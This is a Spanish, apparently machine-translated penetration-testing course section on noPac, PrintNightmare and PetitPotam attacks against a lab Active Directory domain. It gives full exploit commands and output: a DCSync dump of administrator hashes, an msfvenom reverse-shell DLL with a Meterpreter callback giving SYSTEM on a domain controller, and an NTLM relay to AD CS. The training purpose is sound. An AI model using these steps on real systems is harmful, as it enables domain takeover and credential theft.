# Vulnerabilidades de borde sangrado

---

Cuando se trata de gestión de parches y ciclos, muchas organizaciones no se apresuran a implementar parches a través de sus redes. Debido a esto, podemos lograr una victoria rápida para el acceso inicial o la escalada de privilegios de dominio utilizando una táctica muy reciente. Al momento de escribir este artículo (abril de 2022), las tres técnicas que se muestran en esta sección son relativamente recientes (en los últimos 6-9 meses). Estos son temas avanzados que no se pueden cubrir a fondo en una sección de módulo. El propósito de demostrar estos ataques es permitir que los estudiantes prueben los últimos y mejores ataques en un entorno de laboratorio controlado y temas actuales que se cubrirán con una profundidad extrema en módulos de Active Directory más avanzados. Al igual que con cualquier ataque, si no entiende cómo funcionan o el riesgo que podrían representar para un entorno de producción, sería mejor no intentarlos durante un compromiso de clientes del mundo real. Dicho esto, estas técnicas podrían considerarse "seguras" y menos destructivas que los ataques como[Zerólogo](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/)o[Dcshadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Aún así, siempre debemos tener precaución, tomar notas detalladas y comunicarnos con nuestros clientes. Todos los ataques vienen con un riesgo. Por ejemplo, el`PrintNightmare`El ataque podría bloquear el servicio de bote de impresión en un host remoto y causar una interrupción del servicio.

Como profesionales de la seguridad de la información en un campo que cambia y evolucionando rápidamente, debemos mantenernos afilados y al tanto de los ataques recientes y nuevas herramientas y técnicas. Recomendamos probar todas las técnicas en esta sección y hacer una investigación adicional para encontrar otros métodos para realizar estos ataques. Ahora, vamos a sumergirnos.

---

## Configuración de escenario

En esta sección, realizaremos todos los ejemplos de un host de ataque de Linux. Puede generar los hosts para esta sección al final de esta sección y SSH en el host de ataque de Linux Attack01. Para la parte de esta sección que demuestra la interacción desde un host de Windows (usando Rubeus y Mimikatz), puede generar el host de ataque MS01 en la sección anterior o siguiente y usar la blob de certificado Base64 obtenida utilizando`ntlmrelayx.py`y`petitpotam.py`Para realizar el mismo ataque de pase el ticket usando Rubeo como se demostró cerca del final de esta sección.

---

## NOPAC (SamaccountName Spoofing)

Un gran ejemplo de una amenaza emergente es la[Sam_the_admin vulnerabilidad](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), también llamado`noPac`o referido como`SamAccountName Spoofing`Lanzado a fines de 2021. Esta vulnerabilidad abarca dos CVE[2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)y[2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), permitiendo la escalada de privilegios intra dominio de cualquier usuario de dominio estándar a acceso a nivel de administración de dominio en un solo comando. Aquí hay un desglose rápido de lo que cada cVE proporciona con respecto a esta vulnerabilidad.

|42278|42287|
|---|---|
|`42278`es una vulnerabilidad de derivación con el administrador de cuentas de seguridad (SAM).|`42287`es una vulnerabilidad dentro del certificado de atributo de privilegio de Kerberos (PAC) en adiciones.|

Este camino de exploit se aprovecha de poder cambiar el`SamAccountName`de una cuenta de computadora a la de un controlador de dominio. Por defecto, los usuarios autenticados pueden sumar[Diez computadoras a un dominio](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). Cuando lo hacemos, cambiamos el nombre del nuevo host para que coincida con el nombre SamaccountName de un controlador de dominio. Una vez hecho esto, debemos solicitar boletos de Kerberos que causen que el servicio emita boletos bajo el nombre del DC en lugar del nuevo nombre. Cuando se solicite un TGS, emitirá el boleto con el nombre correspondiente más cercano. Una vez hecho esto, tendremos acceso como ese servicio e incluso se les puede proporcionar un shell de sistema en un controlador de dominio. El flujo del ataque se describe en detalle en este[blog](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

Podemos usar esto[herramienta](https://github.com/Ridter/noPac)para realizar este ataque. Esta herramienta está presente en el host Attack01 en`/opt/noPac`.

NOPAC utiliza muchas herramientas en Impacket para comunicarse, cargar una carga útil y emitir comandos del host de ataque al DC Target. Antes de intentar usar el exploit, debemos asegurarnos de que se instale el impacket y el repositorio de exploit de NOPAC se clonice a nuestro host de ataque si es necesario. Podemos usar estos comandos para hacerlo:

#### Asegurar que se instale Impacket

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ python setup.py install 
```

#### Clonación del repositorio de exploit nopac

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```

Una vez que se instala Impacket y nos aseguramos de que el repositorio esté clonado a nuestro cuadro de ataque, podemos usar los scripts en el directorio NOPAC para verificar si el sistema es vulnerable usando un escáner (`scanner.py`) luego use el exploit (`noPac.py`) para ganar un caparazón como`NT AUTHORITY/SYSTEM`. Podemos usar el escáner con una cuenta de usuario de dominio estándar para intentar obtener un TGT del controlador de dominio de destino. Si tiene éxito, esto indica que el sistema es, de hecho, vulnerable. También notaremos el`ms-DS-MachineAccountQuota`El número se establece en 10. En algunos entornos, un astuto Sysadmin puede establecer el`ms-DS-MachineAccountQuota`Valor a 0. Si este es el caso, el ataque fallará porque nuestro usuario no tendrá los derechos de agregar una nueva cuenta de máquina. Estableciendo esto en`0`puede evitar bastantes ataques publicitarios.

#### Escaneo para NOPAC

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Hay muchas formas diferentes de usar NOPAC para avanzar en nuestro acceso. Una forma es obtener un shell con privilegios a nivel de sistema. Podemos hacer esto ejecutando NOPAC.py con la sintaxis a continuación para hacerse pasar por la cuenta de administrador incorporada y caer en una sesión de shell semi-interactiva en el controlador de dominio de destino. Esto podría ser "ruidoso" o puede ser bloqueado por AV o EDR.

#### Ejecutando nopac y obtener un caparazón

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                               
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

Notaremos que un`semi-interactive shell session`se establece con el objetivo utilizando[smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Tenga en cuenta con los shells SMBExec, necesitaremos usar rutas exactas en lugar de navegar por la estructura del directorio utilizando`cd`.

Es importante tener en cuenta que NOPAC.PY guarda el TGT en el directorio en el host de ataque donde se ejecutó el exploit. Podemos usar`ls`para confirmar.

#### Confirmando la ubicación de los boletos guardados

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

Luego podríamos usar el archivo CCACHE para realizar un pase de boleto y realizar más ataques como DCSYNC. También podemos usar la herramienta con el`-dump`Indicador para realizar un DCSYNC usando secretsdump.py. Este método aún crearía un archivo CCACHE en el disco, que nos gustaría tener en cuenta y limpiar.

#### Uso de NOPAC para DCSYNC la cuenta de administrador incorporada

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

---

## Consideraciones de Windows Defender & Smbexec.py

Si Windows Defender (u otro producto AV o EDR) está habilitado en un objetivo, nuestra sesión de shell puede establecerse, pero la emisión de cualquier comando probablemente fallará. Lo primero que hace smbexec.py es crear un servicio llamado`BTOBTO`. Otro servicio llamado`BTOBO`se crea, y cualquier comando que escribamos se envíe al objetivo a través de SMB dentro de un archivo .bat llamado`execute.bat`. Con cada nuevo comando que escribimos, se crea un nuevo script por lotes y se hace eco de un archivo temporal que ejecuta dicho script y lo elimina del sistema. Veamos un registro de defensores de Windows para ver qué comportamiento se consideró malicioso.

#### Registro de cuarentena del defensor de Windows

![image](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

Si OPSEC o estar "en silencio" es una consideración durante una evaluación, lo más probable es que quisiéramos evitar una herramienta como SMBExec.py. El enfoque de este módulo está en tácticas y técnicas. Refinaremos nuestra metodología a medida que avanzamos en módulos más avanzados, pero primero debemos obtener una base sólida para enumerar y atacar Active Directory.

---

## Printnightmare

`PrintNightmare`es el apodo dado a dos vulnerabilidades ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)y[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) encontrado en el[Servicio de bgas de impresión](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc)Eso se ejecuta en todos los sistemas operativos de Windows. Se han escrito muchas exploits en base a estas vulnerabilidades que permiten la escalada de privilegios y la ejecución de código remoto. El uso de esta vulnerabilidad para la escalada de privilegios locales está cubierto en el[Escalada de privilegios de Windows](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)Módulo, pero también es importante practicar dentro del contexto de los entornos de Active Directory para obtener acceso remoto a un host. Practicemos con un exploit que puede permitirnos obtener una sesión de shell del sistema en un controlador de dominio que se ejecuta en un host de Windows Server 2019.

Antes de realizar este ataque, debemos recuperar la exploit que usaremos. En este caso, usaremos[cubo0x0](https://twitter.com/cube0x0?lang=en)explotar. Podemos usar GIT para clonarlo a nuestro host de ataque:

#### Clonando la exploit

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

Para que esta exploit funcione con éxito, necesitaremos usar la versión de Cube0x0 de Impacket. Es posible que necesitemos desinstalar la versión de Impacket en nuestro host de ataque e instalar Cube0x0 (esto ya está instalado en Attack01 en el laboratorio). Podemos usar los comandos a continuación para lograr esto:

#### Instale la versión de Cube0x0 de Impacket

  Vulnerabilidades de borde sangrado

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Podemos usar`rpcdump.py`Para ver si`Print System Asynchronous Protocol`y`Print System Remote Protocol`están expuestos en el objetivo.

#### Enumerando para MS-RPRN

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

Después de confirmar esto, podemos continuar intentando usar el exploit. Podemos comenzar elaborando una carga útil de DLL usando`msfvenom`.

#### Generar una carga útil DLL

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

Luego alojaremos esta carga útil en una acción de SMB que creamos en nuestro host de ataque usando`smbserver.py`.

#### Creación de una compartir con smbserver.py

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Una vez que se crea la acción y aloja nuestra carga útil, podemos usar MSF para configurar y iniciar un manejador múltiple responsable de atrapar el shell inverso que se ejecuta en el objetivo.

#### Configuración y arranque MSF Multi/Handler

  Vulnerabilidades de borde sangrado

```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```

Con la acción que aloja nuestra carga útil y nuestro múltiple controlador escuchando una conexión, podemos intentar ejecutar la exploit contra el objetivo. El siguiente comando es cómo usamos el exploit:

#### Ejecutando el exploit

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

<SNIP>
```

Observe cómo al final del comando, incluimos la ruta a la acción que aloja nuestra carga útil (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). Si todo va bien después de ejecutar el exploit, el objetivo accederá a la acción y ejecutará la carga útil. La carga útil luego volverá a llamar a nuestro manejador múltiple que nos da un shell del sistema elevado.

#### Obtener el shell del sistema

  Vulnerabilidades de borde sangrado

```shell-session
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Una vez que se haya ejecutado el exploit, notaremos que se ha iniciado una sesión de meterpreter. Luego podemos caer en un shell del sistema y ver que tenemos privilegios de Sistema de Autoridad NT en el controlador de dominio de destino a partir de una cuenta de usuario de dominio estándar.

---

## Petitpotam (MS-EFSRPC)

Petitpotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) es una vulnerabilidad de falsificación de LSA que fue parcheada en agosto de 2021. El defecto permite que un atacante no autenticado coaccione a un controlador de dominio para autenticar a otro huésped usando NTLM sobre el puerto 445 a través del[Protocolo remoto de la autoridad de seguridad local (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc)abusando de Microsoft's[Cifrado del protocolo remoto del sistema de archivos (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). Esta técnica permite que un atacante no autenticado se haga cargo de un dominio de Windows donde[Servicios de certificado de Active Directory (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs)esta en uso. En el ataque, una solicitud de autenticación del controlador de dominio objetivo se transmite a la página de inscripción web de la Autoridad de Certificado (CA) y realiza una solicitud de firma de certificado (CSR) para un nuevo certificado digital. Este certificado se puede usar con una herramienta como`Rubeus`o`gettgtpkinit.py`de[Pkinittools](https://github.com/dirkjanm/PKINITtools)Para solicitar un TGT para el controlador de dominio, que luego se puede utilizar para lograr el compromiso del dominio a través de un ataque DCSYNC.

[Este](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)La publicación del blog entra en más detalles sobre la transmisión de NTLM a AD CS y el ataque Petitpotam.

Caminemos por el ataque. En primer lugar, tenemos que comenzar`ntlmrelayx.py`En una ventana de nuestro host de ataque, especificando la URL de inscripción web para el host CA y utilizando la plantilla de Kerberosautation o DomainController AD CS. Si no supiéramos la ubicación de la CA, podríamos usar una herramienta como[certi](https://github.com/zer1t0/certi)intentar localizarlo.

#### Iniciando ntlmrelayx.py

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - 

Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```

En otra ventana, podemos ejecutar la herramienta[Petitpotam.py](https://github.com/topotam/PetitPotam). Ejecutamos esta herramienta con el comando`python3 PetitPotam.py <attack host IP> <Domain Controller IP>`Intentar obligar al controlador de dominio a autenticarse a nuestro host donde se está ejecutando ntlmrelayx.py.

Hay una versión ejecutable de esta herramienta que se puede ejecutar desde un host de Windows. El disparador de autenticación también se ha agregado a Mimikatz y se puede ejecutar de la siguiente manera utilizando el módulo del sistema de archivos de cifrado (EFS):`misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. También hay una implementación de PowerShell de la herramienta[Invoke-Petitpotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

Aquí ejecutamos la herramienta e intentamos coaccionar la autenticación a través del[Efsrpcopenfileraw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)método.

#### Ejecutando petitpotam.py

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                 
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!

[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### Certificado codificado Base64 para DC01

De vuelta en nuestra otra ventana, veremos una solicitud de inicio de sesión exitosa y obtendremos el certificado codificado Base64 para el controlador de dominio si el ataque es exitoso.

  Vulnerabilidades de borde sangrado

```shell-session
xnoxos@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6z/QuWp2pWrXS9zwt7bc1SQpMcCjfiFalKIlpPQQiti7xvTMokV+X6YlhUokM9yz3jTAU0ylvw82LoKsKMCKVx0mnhVDUlxR+i1Irn4piInOVfY0c2IAGDdJViVdXgQ7njtkg0R+Ab0CWrqLCtG6nVPIJbxFE5O84s+P3xMBgYoN4cj/06whmVPNyUHfKUbe5ySDnTwREhrFR4DE7kVWwTvkzlS0K8Cqoik7pUlrgIdwRUX438E+bhix+NEa+fW7+rMDrLA4gAvg3C7O8OPYUg2eR0Q+2kN3zsViBQWy8fxOC39lUibxcuow4QflqiKGBC6SRaREyKHqI3UK9sUWufLi7/gAUmPqVeH/JxCi/HQnuyYLjT+TjLr1ATy++GbZgRWT+Wa247voHZUIGGroz8GVimVmI2eZTl1LCxtBSjWUMuP53OMjWzcWIs5AR/4sagsCoEPXFkQodLX+aJ+YoTKkBxgXa8QZIdZn/PEr1qB0FoFdCi6jz3tkuVdEbayK4NqdbtX7WXIVHXVUbkdOXpgThcdxjLyakeiuDAgIehgFrMDhmulHhpcFc8hQDle/W4e6zlkMKXxF4C3tYN3pEKuY02FFq4d6ZwafUbBlXMBEnX7mMxrPyjTsKVPbAH9Kl3TQMsJ1Gg8F2wSB5NgfMQvg229HvdeXmzYeSOwtl3juGMrU/PwJweIAQ6IvCXIoQ4x+kLagMokHBholFDe9erRQapU9f6ycHfxSdpn7WXvxXlZwZVqxTpcRnNhYGr16ZHe3k4gKaHfSLIRst5OHrQxXSjbREzvj+NCHQwNlq2MbSp8DqE1DGhjEuv2TzTbK9Lngq/iqF8KSTLmqd7wo2OC1m8z9nrEP5C+zukMVdN02mObtyBSFt0VMBfb9GY1rUDHi4wPqxU0/DApssFfg06CNuNyxpTOBObvicOKO2IW2FQhiHov5shnc7pteMZ+r3RHRNHTPZs1I5Wyj/KOYdhcCcVtPzzTDzSLkia5ntEo1Y7aprvCNMrj2wqUjrrq+pVdpMeUwia8FM7fUtbp73xRMwWn7Qih0fKzS3nxZ2/yWPyv8GN0l1fOxGR6iEhKqZfBMp6padIHHIRBj9igGlj+D3FPLqCFgkwMmD2eX1qVNDRUVH26zAxGFLUQdkxdhQ6dY2BfoOgn843Mw3EOJVpGSTudLIhh3KzAJdb3w0k1NMSH3ue1aOu6k4JUt7tU+oCVoZoFBCr+QGZWqwGgYuMiq9QNzVHRpasGh4XWaJV8GcDU05/jpAr4zdXSZKove92gRgG2VBd2EVboMaWO3axqzb/JKjCN6blvqQTLBVeNlcW1PuKxGsZm0aigG/Upp8I/uq0dxSEhZy4qvZiAsdlX50HExuDwPelSV4OsIMmB5myXcYohll/ghsucUOPKwTaoqCSN2eEdj3jIuMzQt40A1ye9k4pv6eSwh4jI3EgmEskQjir5THsb53Htf7YcxFAYdyZa9k9IeZR3IE73hqTdwIcXjfXMbQeJ0RoxtywHwhtUCBk+PbNUYvZTD3DfmlbVUNaE8jUH/YNKbW0kKFeSRZcZl5ziwTPPmII4R8amOQ9Qo83bzYv9Vaoo1TYhRGFiQgxsWbyIN/mApIR4VkZRJTophOrbn2zPfK6AQ+BReGn+eyT1N/ZQeML9apmKbGG2N17QsgDy9MSC1NNDE/VKElBJTOk7YuximBx5QgFWJUxxZCBSZpynWALRUHXJdF0wg0xnNLlw4Cdyuuy/Af4eRtG36XYeRoAh0v64BEFJx10QLoobVu4q6/8T6w5Kvcxvy3k4a+2D7lPeXAESMtQSQRdnlXWsUbP5v4bGUtj5k7OPqBhtBE4Iy8U5Qo6KzDUw+e5VymP+3B8c62YYaWkUy19tLRqaCAu3QeLleI6wGpqjqXOlAKv/BO1TFCsOZiC3DE7f+jg